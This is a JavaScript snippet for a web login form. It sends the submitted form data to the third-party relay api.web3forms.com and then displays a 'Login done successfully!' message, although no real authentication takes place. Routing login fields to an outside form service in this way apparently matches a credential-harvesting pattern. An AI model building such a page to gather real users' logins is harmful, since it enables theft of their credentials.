  const form = document.getElementById('loginForm');
  const result = document.getElementById('result');

  form.addEventListener('submit', async (e) => {
    e.preventDefault(); // Prevent page redirect

    result.textContent = "Submitting...";

    const formData = new FormData(form);

    try {
      const response = await fetch("https://api.web3forms.com/submit", {
        method: "POST",
        body: formData
      });

      const data = await response.json();

      if (data.success) {
        result.style.color = "green";
        result.textContent = "✅ Login done successfully!";
        form.reset();
      } else {
        result.style.color = "red";
        result.textContent = "❌ Something went wrong, please try again!";
      }
    } catch (error) {
      result.style.color = "red";
      result.textContent = "⚠️ Network error!";
    }
  });